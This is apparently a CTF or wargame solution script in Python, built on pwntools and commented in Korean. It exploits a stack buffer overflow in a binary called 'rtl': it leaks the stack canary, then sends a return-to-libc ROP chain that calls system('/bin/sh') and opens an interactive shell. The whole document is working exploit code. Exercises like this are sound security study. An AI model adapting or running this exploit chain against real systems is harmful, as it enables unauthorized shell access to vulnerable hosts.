from pwn import *

p = remote('HOST', PORT) #할당된 VM 값 넣어야함
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
system_plt = e.plt['system']
bin_sh = 0x400874 #bin/sh 위치, 직접 구해야함
pop_rdi = 0x0000000000400853 #system 함수의 첫번째 인자
ret = 0x0000000000400596 # ROPgadget --binary=./rtl | grep ": ret", modern glibc에서 stack alignment를 점검하게 되어 요새는 16바이트 정렬을 맞춰주어야한다.

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(ret)  # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_plt)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()